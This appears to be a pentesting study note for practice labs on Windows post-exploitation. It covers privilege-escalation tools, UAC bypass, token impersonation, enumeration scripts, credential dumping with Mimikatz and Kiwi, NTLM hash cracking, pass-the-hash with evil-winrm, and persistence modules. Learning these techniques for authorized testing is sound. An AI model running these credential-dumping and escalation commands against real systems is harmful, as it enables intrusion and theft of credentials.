# Labs & Post-Exploitation Notes

Hands-on notes from practice boxes, focused on **Windows post-exploitation** — the enumeration, privilege escalation, and credential-harvesting steps that come *after* you have a foothold. For the general privesc checklists (Linux + Windows) see [privilege-escalation](../privilege-escalation/README.md); for the methodology loop see [methodology](../methodology/README.md).

> Post-exploitation goal: go from a low-privilege shell to full control, harvest credentials, and set up to pivot. Enumerate first, then act on one clear vector.

---

## Windows privilege escalation

### Missing-patch / kernel exploitation
- **Windows Exploit Suggester** — compares `systeminfo` output against a database of patches to flag missing ones (and matching kernel exploits).
- **Metasploit `local_exploit_suggester`** — run against a session to list likely local privesc modules automatically:
  ```
  use post/multi/recon/local_exploit_suggester
  set SESSION <id>; run
  ```

### User Account Control (UAC) bypass
Used when you're an **admin user but in a medium-integrity shell** and need high integrity.
- **Metasploit `bypassuac_injection`** — module that bypasses UAC via DLL/process injection.
- **UACMe (Akagi)** — `Akagi64.exe <key> <full-path-to-payload>`, pointing at an msfvenom meterpreter payload.

### Access-token impersonation
- **Incognito** (Metasploit module):
  ```
  load incognito
  list_tokens -u              # view available tokens
  impersonate_token "<DOMAIN\\User>"
  ```
- Pairs with `SeImpersonatePrivilege` (`whoami /priv`) → also enables **Potato** attacks (JuicyPotato / PrintSpoofer) for SYSTEM.

### Unattended-install credentials
- Check `C:\Windows\Panther\Unattend.xml` (and `sysprep.xml`) — mass-deployment answer files often contain plaintext/base64 admin passwords.

---

## Windows enumeration

### Automated scripts
- **winPEAS** — all-in-one privesc enumerator; read the highlighted (red/yellow) findings.
- **PowerUp** — `. .\PowerUp.ps1; Invoke-AllChecks` — finds common misconfigs (services, unquoted paths, AlwaysInstallElevated).
- **PrivescCheck** — `Invoke-PrivescAudit`-style checks for common Windows privesc flaws.
- **JAWS** (Just Another Windows (enum) Script):
  ```
  powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
  ```

### Metasploit post modules (situational awareness)
| Module | Purpose |
|---|---|
| `enum_logged_on_users` | Who is currently logged on |
| `enum_applications` | Installed applications |
| `enum_patches` | Installed patches |
| `enum_shares` | Shared folders |
| `enum_computers` | Other domain computers |
| `enum_av_excluded` | AV exclusion paths (safe spots to drop tools) |
| `checkvm` | Whether the host is a VM |

---

## Credential harvesting

### Meterpreter / Kiwi
```
hashdump                       # dump local user NTLM hashes (SAM)
load kiwi
creds_all                      # all credentials Kiwi can reach
```

### Mimikatz
Located (in Kali) at `/usr/share/windows-resources/mimikatz/x64/mimikatz.exe`.
```
privilege::debug               # confirm the shell has needed privileges
lsadump::sam                   # dump the SAM
sekurlsa::logonpasswords       # dump logon passwords/hashes from memory
```

### Cracking the hashes
```bash
john --format=NT hashes.txt
hashcat -a 3 -m 1000 hashes.txt            # NTLM, mask/brute
hashcat -m 1000 hashes.txt rockyou.txt     # NTLM, wordlist
```
Or skip cracking and **pass-the-hash** (e.g. `evil-winrm -i <ip> -u <user> -H <ntlm-hash>`).

---

## Persistence (practice/lab context)

> On the real exam you rarely need persistence, but it's good to understand. Only ever do this on systems you're authorized to test.

- **Metasploit `persistence_service`** — installs a service that re-opens a session on reboot.
- **Enable RDP** — `run getgui -e -u <user> -p <pass>` (meterpreter) to turn on RDP for a known account.

---

## Lab workflow reminder

1. Land shell → **situational awareness** (`whoami /priv`, `systeminfo`, `ipconfig /all`).
2. Run an **enumerator** (winPEAS / PowerUp) and read the findings.
3. Pick **one clear privesc vector**; escalate to SYSTEM/admin.
4. **Harvest credentials**; reuse them across the network.
5. Check for a **second NIC** → [pivot](../pivoting/README.md) and repeat the loop.

Record each box with the [box writeup template](../methodology/Box%20Writeup%20Template.md).
